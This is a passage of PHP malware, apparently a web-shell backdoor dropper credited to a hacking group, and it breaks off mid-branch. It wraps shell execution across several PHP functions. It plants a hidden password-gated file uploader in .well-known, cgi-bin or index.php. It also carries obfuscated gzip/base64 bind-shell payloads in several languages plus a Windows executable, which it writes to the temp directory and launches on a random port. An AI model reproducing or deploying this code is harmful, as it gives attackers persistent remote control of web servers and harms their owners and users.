<?php
/*
▓█████▄  ███▄    █ ▄▄▄█████▓ ██░ ██  ██▓ ██▀███  ▄▄▄█████▓▓█████ ▓█████  ███▄    █ 
▒██▀ ██▌ ██ ▀█   █ ▓  ██▒ ▓▒▓██░ ██▒▓██▒▓██ ▒ ██▒▓  ██▒ ▓▒▓█   ▀ ▓█   ▀  ██ ▀█   █ 
░██   █▌▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▀▀██░▒██▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒███   ▒███   ▓██  ▀█ ██▒
░▓█▄   ▌▓██▒  ▐▌██▒░ ▓██▓ ░ ░▓█ ░██ ░██░▒██▀▀█▄  ░ ▓██▓ ░ ▒▓█  ▄ ▒▓█  ▄ ▓██▒  ▐▌██▒
░▒████▓ ▒██░   ▓██░  ▒██▒ ░ ░▓█▒░██▓░██░░██▓ ▒██▒  ▒██▒ ░ ░▒████▒░▒████▒▒██░   ▓██░
 ▒▒▓  ▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒ ░░▒░▒░▓  ░ ▒▓ ░▒▓░  ▒ ░░   ░░ ▒░ ░░░ ▒░ ░░ ▒░   ▒ ▒ 
 ░ ▒  ▒ ░ ░░   ░ ▒░    ░     ▒ ░▒░ ░ ▒ ░  ░▒ ░ ▒░    ░     ░ ░  ░ ░ ░  ░░ ░░   ░ ▒░
 ░ ░  ░    ░   ░ ░   ░       ░  ░░ ░ ▒ ░  ░░   ░   ░         ░      ░      ░   ░ ░ 
   ░             ░           ░  ░  ░ ░     ░                 ░  ░   ░  ░         ░ 
 ░ 
Coded By H34rtBl33d
https://www.facebook.com/D3g1d5.Cyber.Crew/
https://www.facebook.com/groups/L34K.C0de/
https://youtube.com/DwixRMX1337
*/
$tmpfname = sys_get_temp_dir() . "/DNThirTenn.L34kC0de";
if (!@file_exists($tmpfname)) {
    function D3g1d5Ex($in, $re = false) {
        $data = _D3g1d5_php_cmd($in, $re);
        return $data;
    }
    function _D3g1d5_php_cmd($in, $re = false) {
        $out = '';
        try {
            if ($re) $in = $in . " 2>&1";
            if (function_exists('exec')) {
                @exec($in, $out);
                $out = @join("\n", $out);
            }
            elseif (function_exists('passthru')) {
                ob_start();
                @passthru($in);
                $out = ob_get_clean();
            }
            elseif (function_exists('system')) {
                ob_start();
                @system($in);
                $out = ob_get_clean();
            }
            elseif (function_exists('shell_exec')) {
                $out = shell_exec($in);
            }
            elseif (function_exists("popen") && function_exists("pclose")) {
                if (is_resource($f = @popen($in, "r"))) {
                    $out = "";
                    while (!@feof($f)) $out .= fread($f, 1024);
                    pclose($f);
                }
            }
            elseif (function_exists('proc_open')) {
                $pipes = array();
                $process = @proc_open($in . ' 2>&1', array(
                    array(
                        "pipe",
                        "w"
                    ) ,
                    array(
                        "pipe",
                        "w"
                    ) ,
                    array(
                        "pipe",
                        "w"
                    )
                ) , $pipes, null);
                $out = @stream_get_contents($pipes[1]);
            }
        }
        catch(Exception $e) {
        }
        return $out;
    }
    function backd00r() {
        if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/.well-known')) {
            if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php")) {
                $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/.well-known/.default.php", "w") or die(" ");
                fwrite($m, $code);
                fclose($m);
                $outfile = "Log File Success!";
            }
            else {
                $outfile = "Log File Already Created!";
            }
        }
        else if (is_dir($_SERVER['DOCUMENT_ROOT'] . '/cgi-bin')) {
            if (!file_exists($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php")) {
                $m = fopen($_SERVER['DOCUMENT_ROOT'] . "/cgi-bin/.default.php", "w") or die(" ");
                fwrite($m, $code);
                fclose($m);
                $outfile = "Log File Success!";
            }
            else {
                $outfile = "Log File Already Created!";
            }
        }
        else {
            $file = "index.php";
            if (strpos(file_get_contents($file) , $code) !== false) {
                $outfile = "File Already Infected!";
            }
            else {
                if (@is_file($file) && @is_writable($file)) {
                    $put = @file_put_contents($file, $code . "\n" . @file_get_contents($file));
                    if ($put) {
                        $outfile = "Log Infect File Success!";
                    }
                    else {
                        $outfile = "Can't Infect, Index.php Not Found / Not Writable";
                    }
                }
                else {
                    $outfile = "Go Home KiDz, This Server Is Very Hard To Open The Backdoor :v";
                }
            }
        }
    }
    if (!function_exists('base64_decode')) {
        function __DnThirTeen($input) {
            if (empty($input)) return;
            $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
            $i = 0;
            $output = "";
            $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
            do {
                $enc1 = strpos($keyStr, substr($input, $i++, 1));
                $enc2 = strpos($keyStr, substr($input, $i++, 1));
                $enc3 = strpos($keyStr, substr($input, $i++, 1));
                $enc4 = strpos($keyStr, substr($input, $i++, 1));
                $chr1 = ($enc1 << 2) | ($enc2 >> 4);
                $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
                $chr3 = (($enc3 & 3) << 6) | $enc4;
                $output = $output . chr((int)$chr1);
                if ($enc3 != 64) {
                    $output = $output . chr((int)$chr2);
                }

                if ($enc4 != 64) {
                    $output = $output . chr((int)$chr3);
                }

                $chr1 = $chr2 = $chr3 = "";
                $enc1 = $enc2 = $enc3 = $enc4 = "";
            }

            while ($i < strlen($input));
            return $output;
        }
    }
    else {
        function __DnThirTeen($s) {
            $b = 'base64_decode';
            return $b($s);
        }
    }
    function __DwixRMX($content) {
        return @gzinflate(__DnThirTeen($content));
    }
    //===========================================//
    $os = __DwixRMX('M7TTT0kt088rzclRMLJTM1RQAwA=');
    $port = rand(1000, 99999);
    $tmpdir = sys_get_temp_dir();
    $rand0m = substr(md5(time()) , 0, 99999);
    //===========================================//
    $xphp = (D3g1d5Ex('php --help')) ? "on" : "off";
    $xperl = (D3g1d5Ex('perl --help')) ? "on" : "off";
    $xpython = (D3g1d5Ex('python --help')) ? "on" : "off";
    $xruby = (D3g1d5Ex('ruby --help')) ? "on" : "off";
    $xjava = (D3g1d5Ex('java --help')) ? "on" : "off";
    $xgcc = (D3g1d5Ex('gcc --help')) ? "on" : "off";
    $xnode = (D3g1d5Ex('node --help')) ? "on" : "off";
    $xnc = (D3g1d5Ex('nc --help')) ? "on" : "off";
    //===========================================//
    $code = '<?php if(isset($_GET["D3g1d5"])&&$_GET["D3g1d5"]=="v3rdug0"){echo "<center><form method=\'post\' enctype=\'multipart/form-data\' name=\'uploader\'><input type=\'file\' name=\'file\' size=\'45\'><input name=\'_upl\' type=\'submit\' id=\'_upl\' value=\'Upload\'></form></center>";if(isset($_POST["_upl"])&&$_POST["_upl"]== "Upload"){if(@move_uploaded_file($_FILES["file"]["tmp_name"], $_FILES["file"]["name"])) {echo "<center>Upload Successfully :D<br><br>";}else{echo "<center>Upload failed :(<br><br>";}}exit;}?>';
    $php = "pVVdb9owFH2v1P/gRpFINFoIqJpUBn2h2tOkapu0h9JFwTHEahJ7ttMwrfS3796EZCGEim1GQOx7fHzul/PhVkby/IwpJZSvmBTK8HTtDN3J+Zlmxjc8YX7ME27KNbH0eSJjTrnxV3GmIwdXbROoNTOaTAnbyFiEzLGI1Se79QJC0eqNx+9xkgcwSbM4xglrTnQEEwtYQAn5evf503RjmEom91+8aW9h33+bz3qTnRnWJoMlTwew6ZJbuD3B3a9kPv7oza+Jjlgck1eySNHIV8RZZSk1XKQ+23BttNOTNDWxvxLqqee65Nf5GYFhSx4C0R9b4SVakKO0Tskl8VzwF0Ljtc279WFzXQrNNz4EVfPQcTsItijR4Rogjg2Be37wHhuaMH7aKBYkvhb0CZKjmXpmyrEMlTeDwfCq+NxY5IpU2yEFkNpUlP+wuxJUEe1SLDI4UvfJuFZs04PjAkqZRFzTK4AYEYscdOhsCTMHCsrP0iBhjtsnQ+B0C2etnKdW7Q2OVa64YY5NQV0CoqFSaI6huSLWzKoOwZFHPGYYWXIBTKsg1myPqcwZCF5hFQJjc3Mdf8XWfhIYGjnWgIYL4jx8X+jHd+6AY6lK+CrlHvAW3CGWA5ghpJNDM7Jz7YdcOYAEChpVzx1oWwDXvq8t1JYw8BBZjeJJM8S23AUTq8YiLy/kKOJHBgiXLCGDTy1+ZC9lzMdrL7y+2+A2lGIdpKG1tZkz0fRu28grjYVmrSxUi3XxlE4erYfmXjvE2g+UCn46QzKd7R4tySWD1FnKgkrzOgw5Gkbdhr0DpMJ2V4L6QrIUVEZ9PBXLgssmEpNyAblWTItMUVArsWb2bwEcjQZbxtA/eKsi2cMQmnJ4EtI7GTk6CUlboF1XGZUddlNxVzKxwiximZXPpSq3u6psFdRZKnJY+bCT2O6FWmPMKNwqKgBkjj8MfvB10NXEPPUbJ6jgSL9yvAuAPixxVHc1YlVvVVZs3kZt3xJQu3eKihr8thT6TypGf6Ni9P8qOnpdd/V65wVQRvuYxTtq2S+golcra/1W2xYv0dvZbw==";
    $python = "fVRbT9swFH6v1P8QvGm11WAoG9IES6WKBoQ2oGo77QFYlSYnFy11ItuB8sJv33Ga9EbbE6WNj8/1O5dPRyeFkifTRJyAeLHyNx1notlIZnkmtSXBVsU0l5kPStmZstUbvpn/D7Stkxk0G7lDSLMRl78BhJaKIU2pzy6aDQvJqDorE3yQ5SCob5dizlgW6EAHWaE3hG4HrmGDlLvYidjmsoUzCbqQovTJF1a5BC+grF2z0OIaa5ZryjgIPwuAtgodHn9voalFIp6vk0ysMklCK1NceDM4cojQpGIbCh2fh0kKIqNsxUVpREvDjBKYl2iO3eGdM9cgZ5eDUcdpfR786Xdbl9Utsi7LOqjYOk6sH19IW2lJQ9YmVnf9cLY6Ve4gVbAWz2uMwVgG3DWmIS3ftjglbBi+BP+Fdk7PvjEeQIkHKfEgbFMe5j7keoeR3FNqS3QzqJoQR0SKStY93XFraOpI4Ao86ceU+MGTRR//PqnnNiO2tMPUi5QRuL25fxi6V72Ry3abQUfTPR6qa6xQ7umYJypIJJ3ySGZFTjuMHVAzhHp+vKWyXwMbD0RA9/XbHs096C1DMBNTjpo84NrkWGjLE0GJOX4b1KuAzOmjaum3nqRrD0/1QNQJXGwMG3kSpI2ARKD9VzNXpIubIHKw9bknoxdcJYuCR8xxzuqt4ESPnedmo3QG80QjgmaVJELTHL+Us9gxfPFHq1PvenJ7746rBcRHD1c/J6Px0O3dGR3MSpubLF8qjB5+TYzUus5k6P4eub1+f2gbpzuiUxynMKCUnPLyIXZeV0nxNMGRFvS8YpiJwnXmMQfT9c1s1Cvgw6SYfclVCpCX2e4o8oEVs9ZIlLxb/a83nf65NTIdYL1jCQ611Y5W2muKLPfiIYvL3fgf";
    $perl = "XZBdT8IwFIbvSfgPdQ5Yk5pBiDfMEck2zYIwsg6NEV1gHGVxbMtaFMPHb7flK2ivznn7nuc97eWFvmCFPolTHdIvlEORlEsLBsj1Wi2aRZ/AjXJJzZipvnmyYjNTgWWeFRwFjt8zlxyKuTGgDbM2UgdP9qhdMw73QjR2ZDZDV7EipuN3TaK2c/1byDFe7XAVy+vRgWNVkN5VjI0I4eYH8LzIeDb5Scdz0Go8ymtYENhuJY2S6uAudPtOQKrUs7ohDXyn0yMqx+v1NAYN79NuO/79o2k28KpcQuKoualK6aX+auwVBlwys1xCqfcQSpzAUi/0nSF1OrbtkwY+uMVrpsInJ8bTaRHGqabmxO1LV9jpP+OzeOlPYsYhFRPNfxfjKAIRaRGKT4sItEWULbKb9w37GtEZJAnajlKF1I+mLIcU0cB2+0S5qVqKcRS8YUCU9rni+P5B2Y/CEiIk/vvvHlGSMdAsbOwLeipkxlkj+GedYOMTNuaoLprNLw==";
    $ruby = "rVRtT9swEP5eqf/B89jSjOLQTXwYzFRAB0Iaoips00QYSp1rY+E6me3QIl5++5yXtmFtgQ9zFDm6PHfPPXdnv33jpVp5fS49kDdIpf3beq1eU/An5QqQo2N2DcapWJLARDIYgZPhQhggnbJrXa8huxSYVEnU+77/66r7be/88LR3QsJ4LFmggYwCw6KGM9JjLu+zd8TlcOy4baNS2B4EQkO9BjKcBlYQiIytoY1ySwJqv4tPPkCHXACBCddGtyugAtgt8yQSxvlPMo1HTHxVJpyzldFyHchEIK23IkOd9hue73lN7PvYnUNLkWqWq/Xd6x39IALk0ESUtgpcZrvYvKSP3u+LzY3Pl3et5tbDmtdO6LE0MATVKBHuttVgCidNzw+6Z6BuQOWJY9xMSlmMahIwBkkJZSRRXBqEH1Hn01Grs4XOIhACPfoSF4g+DLmc18TmKWNT7dd0DSjLisKfWmECDOmcZNDAMEliZdD5194JnRhQo53uWYs6/lr3Z8ffdXbK/9a4k4+TjtAGR/4X//27EPm7+fax2HFzkD2VdkHe+yr5VN1sCDDB7jrexU9h48jOABI2/yGYf1TlzQq4BgRKxWpfxVkJRNaQkIOv2mveokNZJEFYFI8SSjFexJS4LBILEfng8eWYbAkqylGyUI83HcctQq92mU52aM8bM7G6bTeEuxpesMzq9BK0w5VNwMZ+Fjmb9mXrlb2ZxRK6rJY/3n6+WsukF+V6vaoX8f9ZG6wOdnxKkjgB2RBNrLB7d8/j+ykBj7MLKVzH9riuL7A9rKBblvqC8Ymhcm9pls7PQgUxu31A6lRV9GjCRFwVqKnkonJ1zuUXQazxLw==";
    $node = "nZDLbsMgEEX3kfIPyBuDVGG1UVdRdpH6AVn2JYonAQljd8B2pSj59gK2U/ehLMqKmXvmcodOIHGN6C3ZEIT3ViPQXCptytcGawnO5YwnYL1cdAG24OdoKHM2Ss4jiGquDp0LIGvragPfnhpaCRldFBgTkLx407ZwKg+K3tMxDW+M8PsaK14JLxUtXvpAaca+5mRVcviA/OIo8NAFYXKI5eAZb9yAPXi12azYcbkg4cQRFfiwGpchv4cdYAdI962VXteWugmNx/EetQeancl29XC7vSe7lOT8ZLO41cQNuwXf9Js0xZ3rTnHnS205gmsroOynVLeeh8ezUniR3UxhCI01O04xUrU+/XYGxH+OXxubQv85fbkobrTzYNOPP949x/7pEw==";
    $c = "bZFRS8MwFIXfB/sPcYqmErd16tOMMGyVoU5ZJyIqpaaZvdglo8lkU7bf7m2dsNYVQsN3zr33JNkFJdJZLMmZsTHoZnJer+1usAzU+z8Yp/BWhQvTsoupNFu40eJD2oqgpAVcLVAVYaYAJxQQlCWTCBTNN1H2LphIoowc4vbz+dX5rtcIfrlomGCau91fgrFnAiHOjeI4C0ERWEswpnkjzjt/5QVtGlDhOJpAuuC9y7A/8EfdqjzVmeWJ1crQyGqgRQr31XH+OfOhTVP8ioKU9gc9zxuGvcHTptvw36uh65EsuLu4DoPR0O/dsnbJKW1u1VNLDbpuwtxZFIRD/yHw8+5sXzMDX1KPqS6HGtMd48g5WFpq+gYqxna0cl3k0NkH1p67JXOKryIV2k83qeCRELJI1a4mxuaCNVbEO75yvVMSJDJNyepFNVjnpOyNZ9MOercxdwvrlOYsMNeENuQ8fx8y8oe3fG5lNuneBy4/2Lt/9M4PumsVEW6lIC08e8sk5AgapeOk2kgq/tCyXlv+AA==";
    $java = "nVRRa9swEH4v9D8IP8kjqE3HYCN4jK1jDAYdS9+6PCjKxdZqy0Y6xwkh/e09JU4qxy5j04ul83en7+6+ky6q0iL7I1dS6FK8mVxe6MBkAPe2y4uqnudaMZVL59jt22/j23fbywtGq7J6JRGYQ4mEWGoj8xZXIYM1glk4dp9ZkIvWJXT7bqoap0h/C6bdpA+4q/EFUda4p3MCHWhVyLtxRj23eIuZdkK7hG7Zb8mY+Hi7MOCnuxVYqxfQu2NV6gWzteFxkIVfaDdnFr/mG4SHGZuzhBloDsf34w83s0kfqw0yRUAi5avE5/EAqMl0Dlx9TK5jNnCfX5SNaKxG4PPR9UgNRTnClnntMv4a4q9kdl3T2VFJVBn/ulZQoS4Ng3gLgvppqB9SPd5bqYDuDrza7akVbc1bTe1LX0htOPVTm5TqKm3qwkb4EnrdBlwPWKaKBWUTXc21uXJZFAD0kk83DqEQKeBPW1ZgccOj0gkjC4higeWPsgH7RTqiK7RZwPpuyaNGmyj2fdi2sekThdm0Nzf+31M7LWyaQZ6zp98mpBCopPEsPtPZddoyLdUjIMtaHR2OHURff5SYr4/IwaSYJcn4XLL7EvspT2j+EFKwopLWAR32ng/Xs6GuT8HSdLSM3JFRYOQ+6JCnp++EVF4RPdXt/oN9OO6p9lwyX7/APCjuzquQlie/0D7oSNjjaA39JvUo8C8eBfxVG9QF+LDtlsQDa1CcdBJ3nq9TL0i847aeVKCql8rIExi62HvevHim/umr+hkNuo4FzZf1/ahuTttXWxNs/22+6bN7Bg==";
    $exe = "7Vh5VFPntj9JDklIQgaZogY5aBSsiExVRNCEWQlCGQQVSQIJGMmAyQlDtRIaQGKMjXUoxZGWentbq1gpCChGgggVFWcoIFhpL7wwVb2ABT33oN6uDm+tt9b966233l7Z39779/32zvedZJ3z7RO1yQjgAAAAUUUQALgAvBEO8D+LBlWqcx0VqLK+4XIBw7vhEr9VooKylIoMpVAGpQnlcgUMpYohpVoOSeRQSHQcJFOIxB42NiT22xoxoQDAw+CAH1KaY/9dtw+g4cgYrAMAoQEd1ZPopwG1lai2v13dDI59s27M2/W/TX4zhwru9Qi9jem/4fTfbwKt54cB/mPZagIA5n+QlxCT5PnaOfm7BWH/cn37UJ7Xv7fxev+z/srjvOF5/7a59rccu7/wTD4enitmvtzFxhprXWZ0rHvn3Z0jVw8CQCEVZbgBwCIACBhqQ5A47ZBfeQSHAxSZYNa1EDYRIIDY6p7xKZBNRdrZFDKdsWhgWF7TTaW3gQTrZJAUYHCfCBjvctfh6OWAJ2clIOCA+My6kdq5XGeKqxuRW9f10cvkcqZAGaR32rvd+nNwlW5jf6ZCH0zX+c8X2V52wbV4xoBS/a2R+nP2XDqFfFHbPzabyoKHbB406JcRj/qVH/afPHd5GLfBPH+njrX2ngFeBChqqmU0N72r53JM4H57U07gevzjnkADXhlVj5kNEHeokIzlhdpJDK3wuc0tWtFJwiNpzWUvk7bJbXOjmyE7+CAcGXj4Vq/iFd4x8IC613I+0IoWFOh0qxjnLUgAYYnLcL3N+W/tCi8ggKXCq2vwNK6+8ilmiaHKSPZXdKrq1+0tVHkyV/tH1O2/FHtxVgHmccSpoZa5ZCO9O3V3P6aoKyn/n69K535eDrNc9UQfmDw6aqiuNFx0xctZ+zBD7SOT9oXWA5kvfUqcLxkjF2Ejy49W7jc/skP6dOM0oxFIfzI6qbehMItaYb8E3U/NzAtnH7cCnO7YlAUmKuOWukuwvn8B0cHa1a9nZJS8oNVsvJBkGTRyt5jjDJM5OVU87zRk+zQjcUPcewVDSbhr9dcG+q+rDd+1fVYJ1NEnHYcKkQnd7WdfGYoga/C6RF7vlEEEvdTgT6uwxAQM5c4xxk07Ap3yrfUBLREvDzdPdI0k39eF1nzQD+SR6BSxed1mCWHCRWByfej33WjX3vQFj66FVibo8bb1TkNmf0NoE/tguksTNnlYPLsfsANbaDUBNTmndixgsCKb9QmV4f2667Z1n8QbEprwIIfIpoh/HnqXyfJy/+SnobFax1wSy8tXWV30MTG1UlLVKPbBBUz29QEB33o2tiVytuBmpZzsp+JEW7yre76w1XOIxA4WcURWIQwOuRd0D1D3s1zYxr6yqp8beopn30tPIdEut1sTj+5gdlNSGHFs/cKD6fTGo1WV5MeBOdV5/xCHpy+WFvLO5ZX5saMyZrnN9mUzKht+IsbT54QYF7mX1j7rfnnJZkjm72BJuUb3LCKyMJiRh23fktIpRF2RHWmszSWNyGSlQ1HKwc9jW6ZX3xa693c8b1UvcpAvV84NanvJPmb9ws+1HrrKAphe9MaUCDyGUPxx+osUevG0W3D6vhun9AX2DJD+nXlua7tLnFX197wDTIqn/wcX/4nEG8RjGzen8LcYhNP3kYXtkBa28TMS2ga0FO+WoY7uMdRA9/r7drdA2udNc7d6U7C39NtH7QvGR1ecwsH0Cxi7JlYjhf3A3J76iz5+4dm9fUxwqLOKdtF1jW0Nj7ehsiLQ7f6P/CE+NgkmXbOieExi4Vkjm6Q7KEF+dpyRNQ12mktNSI9zwYjVlVfYovFdj2P14DHhZf0I7TB22IxZ+Uw95Lt+xWmPzW7zThCb2prMRywnBz4a5o+bplyAo0eTdI3vOtY0TY1DQMwx0jGv9r+T53zhnjqii4yjffa3TyjbRJaGHup48xmC1obViCFrVu/uWY2daHTSAFQQwLww7g8mYukFP063rq4AofErizmanyC1R8+UzLldkxmIz3bKsynaVbJz6E7ufD8OTCoI2fzMXOa67BZFA1iajQDmTnt50cverieja4yEOWV3R32THM9+1EDfyNElsyN5gVfa8xzm0CsKE/Wjg3hPR/A0WDUQ1CP2oiVzebW7RuG6FPYZzzUw+7wFMdg/0O1kx+tu6aTspFkMu0u3Py1OrdvsRwXVS3qIAQ/nE919fPTv6TusHqoD9P56vxfJ5uyaD8hLl1HbDxocoXjsRxCfouJkibeYUlQMOn+TP62rI6P6kHIewXmbxtl59BxMbt6Hn7c7NL7r0LfiF/FfkTFP1z7UF9gOjYqOP694ReKlG8uhCILZ4cLk2Louy9ylYDaB5GSpk03l7upb584gR0DH2adCBgMvutH29dq9626VPPCPGpciG6fpLvUOP4Cb6UC9VA9yA9fU1i+m5Vdd6SaOFYVjblJqhq/1FkzZ0bTaS9VxV1UmstZ8s3b8V7qhmOa+3Klw39p5h/cP/woRx4hVQfHLQV7ijTbFfRqy0T0jSeWhjwNrQeRDY9fqtJiPcbZ5xED4xAdnMnHep5cq7+h79RkGq7v6q+5Hztve262b260+c9h61a6Jpb+ElkPVa9Mnax7k4Qu+Hzk/tU+ALP6+Frut4L8wvwqXOIaVMZmDCsrKJwU91e/13gGfet8EPgZ8eoaeLvXH+JpXLR8vuALdasb5sXZVPKZ7Qv+8X0qYKPCNLid6Xn7s92DbPufW/GMMQ4ylT3YhU2RP3jZoIWsTJJQvLzOb4KmixmIXZAohtsI0xO4Ybd9QtpMFc0r9i+SkE/biRFTNo+XMzeaXFmx0MEZvV+T2DvOL4iVjg0hnqSF5DVuA58eyHQvO+yIH82Op3dkiTwGDvTOClHbC54L6/aVn9bhshq5Zntv6gbVv5YFxmGjU+bLlJv9Ht/Wbidvvhwa4DwswuF155mXl7pcsF8z2VUyv8Qa7QKpuTN//d9xDa73tLPNsyuCD449KMy4uvAOH80+H+nds0OGSlF+0yc4pyit0X80iynZmCc7YbKELGsKlRFreHr5RYkdi1u0hBDWHIM7eLlj7O/A8PXZlh5phiVzhtpMYTVzZ+f0sfdCTpO/riIG/POPpI3qonVcE636lNy2w/EBnz7Os+ry23dIVLWyxzf8pRDkrdsvZ7HMeDl9LthIXqftePPJpi25lABtDHg1VWK5Gu7vOW9fBDzRFw2WWAMuBo6Xbxym8Fsf9l0SV3AZC7kGCxsjFz95ZcgEdRSerKtHRePpiaQVquF8KOOiI58XEz3BCfD1nOFnSrTOcAFFE8sysXxJ05HiqTNSd5W57YvBJU+vSqKStAMKxP+gLmOaOafL3FLpwKjGAuGgDsmYPSSpJzUjbttTLx0MkvfwCQaQAf102P1acIVHBYmWwVKhSiVWpPit8M6GfEQRRbRVLpZA/lKaQy8VpsFhEIgHB0VFxMaHB6CxiYnKAKIk8I2fmNAtLZGIoXSiRqpVifxIAQRskNQ6bXylhtVD6njqPGYhXKL/rqrkOLUzNW6eChDBWJFo63lv7zXbbrPU+CfJMuSJHDmUVjshrxtUixYYPFGmLJAqGUgHXX5J1kRV7s9er6GEeJJ/5NdluqRLhkvfFhs+whf0Qzspoa7d/4ysE834sgNlJxMylgGAJxi3f8fkWWd9lBKEAXCpRiw2mgjLVBCeV6mvFowZg7+E17kdu5iyJaDKlSevypzyxoSRrrpkKhpHpC6T0xs6p6hr7rHmQrSbDdlnSXcpBN8IR2/AkTtmX7BqWzDgMlV6LC04oOjVYNw5GkAUg1c85oOWTkeHOYuDrYixI0eIWiyhhGxtT6sznm4PJmTa7bQqkvbn8lt044Oxj890l3VtssRWUIGuBliVcQf8yrb1NgGMu2Ts7m1+pyXliaZ9LxRQtm2YQBCFaq43F+t24sKJPh3dN9lDjGTDp6rVms5OEGkPDxnZSs0vwmZaTrWvuOdW/HJZuiNaCxbjdTU9IvkHkjVRv4xE7znX3qLvvTq+n0pMLIEffpLXVV/wE5yHZO9wEuojBm3BeUBicsdBXS/HLFdxyv5694BRrrVVM8LYbH7rvDb7D3V1tE3Z31dG9S9YGhPlf71g+/h6peY/K573Q0EjfHutRkrnZdrPR/Nx4c/6NgpjgXPn+1AM3lPabaJuLtO717TkhbaVJpCLp8vFPQyE+OdkdwGws2WN78WNC/ADMUS/EtRyKKUmvPSrFTW8nKVllpyRlvrxNcGGpDHW/utgxRlWpM47cXIbzWK0KjyeI7vpG3cXBHx48fioKdSsvNt180JeNugNPp/G9dHiw7Mp6FuEdP1wYWuhUTFJ6libBKCsrMZbB142LSypxWdAyEdoHZLmsqrQC3GieGkZHQBZOFhLxmeacNRRfn8UEEw6BSDv3/svZRg7AwtklaCK5QBKOUrB3DzG/k8Ut9RRigqUKlRh83jsdIZSLpGKlWAiLY5SKNOT6cPV+Li1EbA+LJbAkTSiNE6dV9/A4cQ6hcjulfbVVZmIu3Z8SvqJHrqhZmC2hymXipRuE7sLUjurA6kgukydUsZRzlDbPb3z4MkohUksLnEO4yPiQlX1EHLwaVmetlacrDvUkqyB8Trbk/U/GZeIu3qVseyKcIN/K//lV9XLR58ezHMIkUjMLq1wxES9VCU9I1a9ivB/eOJMPB9CqZDWODTaJwqSwqjjyyDdWw2ujU7fND/+iq/qlby6fnxEumy//OkMb1dGgomZhxRib9B07XlTLBsVuKr4wiwHnZdFqb8z+Yb8f4VCq1ZK2R6c9qAs9/eAfRmYn00uZBIXESp6YMtAnXQhg0uen5zzvTe7PIcjEsrSsvNUElSRD3unww3WhNDs9CypOP1sp7Rr/W1NiHDeOk7mQa1cfVG5zpy246x2pU531eShXlba8dkLYsCNVIhd5qwJmJTukgw4dGVsV2Z2b6lPztu86tVUuxePD25Uq6SZi/srizBWcgzGhPAwR7Z/5GkFLc2z7TOdM9if/6ADM0mFNQ9IQPpl+2JO8ec78bsd7GDAgT36LepLCyVqCAyCC8s4KkM6lZ3Xi13kctDIuZ+JalYDn9jaPD2UllObdJQzj4yLyVC+4QOAk8BANRN5eIRWen8JWOAwNyVyYJg+l2yTdEN3a6crkeIi3FnRAPUXKspM4Vcwc15YJHi5VrTULwkp3OmpyJMFZo5iKwRP4ecGx8X40QcYB5gm2KyxVHaI8DYCMi7Yyxi7NBQoYbzpVNoC87VkFDfaVHMDQYOEjSKL2BmKhG1/LHnxYCSEc06Um6OdpR6YZXcrhCzNt/O8QhgnTpRpVW78NVf1erdoBnNLmSh8RzdaOITCsu/p7fusfAjXE/dPkH4ppr2ALXgLPEER7G2OwW6Z9OZ1N24MNQhe1Vj0xmIY+MYx6rLYR1BG010DtIJjzC+bWIA+FU3QTtTvRle4hhLsPBGByJjRrAPVTPWEPH0y/MkC8YqIXNy2e1FgGMGMzuVYlHT92GhoAIwDoCdYmOEDPBw2FnoAJ3euzGO01InJYhPqH0HJEE9yte5EY8fRMAnJ45sUESifocFozaHmMHM5FAf0ZKTqi1cYQpH7mVUFM/DYwLhG5b9h9Ar16GihfI3DLT4qJj5kBkwzHZ4iG+rVoUqKX6auNa2O2YeKQ20JDCFuzDVjZpP5VO6QZ9ItFEMucDQ2ghgNMf1Nkgm224TYiMJv+469Iu2UkpZGCljZxAC2qdoI39ncSYeIA/y//C6S0HQBE7X/EvkBjzZ+wSjQu+RNWj8bG9v++bjOK30O1H9XnqGJvAwD99pu5eW8t+631fGsjQ2PXh/J8vD1CeDxApspOU8LoMU4KJMZ581H0jRsdHPmWAfAUQhFPkqoUKvO4ABAuhmeeT1yRSClWqQBgg+T10QzFYPRo91vMlUoVab9FYUqxGP3m0FzJ6+TXiQBfokhF//zoHVuRlimG0dozN+f/O7/5vwA=";
    //===========================================//
    if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        $lang = ".exe";
        $name = $tmpdir . '/' . $rand0m . $lang;
        $f_bp = fopen($name, "w");
        fwrite($f_bp, __DwixRMX($exe));
        fclose($f_bp);
        $out = D3g1d5Ex("$name $port");
        sleep(1);
        if ($out) {
            $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
        }
        unlink($name);
        $_SESSION['exe'] = true;
    }
    else if (!strtolower(substr(PHP_OS, 0, 3)) === 'win') {
        if (!isset($_SESSION['exe']) && $xphp == 'on') {
            $lang = ".php";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($php));
            fclose($f_bp);
            $out = D3g1d5Ex("php $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['php'] = true;
        }
        else if (!isset($_SESSION['php']) && $xperl == 'on') {
            $lang = ".pl";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($perl));
            fclose($f_bp);
            $out = D3g1d5Ex("perl $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['perl'] = true;
        }
        else if (!isset($_SESSION['perl']) && $xpython == 'on') {
            $lang = ".py";
            $name = $tmpdir . '/' . $rand0m . $lang;
            $f_bp = fopen($name, "w");
            fwrite($f_bp, __DwixRMX($python));
            fclose($f_bp);
            $out = D3g1d5Ex("python $name $port $os");
            sleep(1);
            if ($out) {
                $output = "Success! Backdoor Opened On Port : " . $port . ", With : " . $lang . " Languange";
                @backd00r();
            }
            unlink($name);
            $_SESSION['python'] = true;
        }
        else if (!isset($_SESSION['python']) && $xruby == 'on') {
